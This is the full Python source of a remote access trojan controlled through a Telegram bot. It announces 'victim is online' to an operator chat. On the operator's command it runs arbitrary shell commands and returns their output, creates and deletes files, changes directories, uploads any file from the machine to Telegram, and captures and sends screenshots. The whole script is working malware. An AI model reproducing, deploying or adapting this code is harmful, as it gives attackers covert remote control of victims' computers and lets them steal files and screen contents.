import telebot
import os
import subprocess
from PIL import ImageGrab

bot = telebot.TeleBot("YOUR_BOT_TOKEN")
chatID = int("YOUR_CHAT_ID")

# some executable functions


def send_msg(msg):
    bot.send_message(chatID, text=msg)


def send_files(filename):
    opening_file = open(filename, 'rb')
    bot.send_document(chatID, opening_file)


# creates a new file
def create_file(name):
    new_file = open(name, 'w')


# delete a file
def delete_file(name):
    os.remove(name)


# runs some of the shell commands
def run_commands(cmd):
    output = subprocess.check_output(cmd, shell=True, text=True)
    send_msg(output)


def take_screenshot():
    image = ImageGrab.grab()
    image.save('uius7uyirf7yf.png')
    send_files('uius7uyirf7yf.png')
    os.remove('uius7uyirf7yf.png')


send_msg('victim is online')


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Welcome, Let victim come online!!")


@bot.message_handler(func=lambda message: True)
def main(message):
    data = message.text
    # print(data)
    index_of_command = data.find(' ')
    command = data[0:index_of_command]  # command to be followed
    print(command)
    command_string = data[index_of_command+1:]

    # create new file
    if command == 'create-file':
        create_file(command_string)
        send_msg(f"Created file '{command_string}' in '{os.getcwd()}' ")

    # delete file
    elif command == 'delete-file':
        try:
            delete_file(command_string)
            message = f'Successfully Deleted {data[index_of_command+1:]}'
            send_msg(message)
        except FileNotFoundError:
            send_msg(f'File not found in "{os.getcwd}"')


    #  run some commands
    elif command == 'cmd':
        try:
            run_commands(command_string)
        except FileNotFoundError:
            message = 'Oops!! This command can not run!'
            send_msg(message)

    # Change current working directory
    elif command == 'cd':
        try:
            os.chdir(command_string)
            run_commands('pwd')
        except:
            send_msg('Folder not found')


    # send any files to telegram
    elif command == 'send-file-here':
        try:
            send_files(command_string)
        except:
            send_msg('Error: file not found')

    elif data == 'send-sc':
        try:
            take_screenshot()
        except:
            send_msg('error')

    # wrong commands
    else:
        send_msg('Error: Invalid command')


bot.infinity_polling()
